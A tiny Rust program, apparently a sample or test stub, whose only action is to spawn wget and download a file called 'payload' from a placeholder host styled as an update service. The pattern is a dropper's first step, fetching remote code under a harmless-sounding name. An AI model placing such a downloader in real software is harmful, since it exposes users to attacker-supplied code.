use std::process::Command;
fn main() {
    Command::new("wget").arg("http://update-service.example/payload").spawn().ok();
}
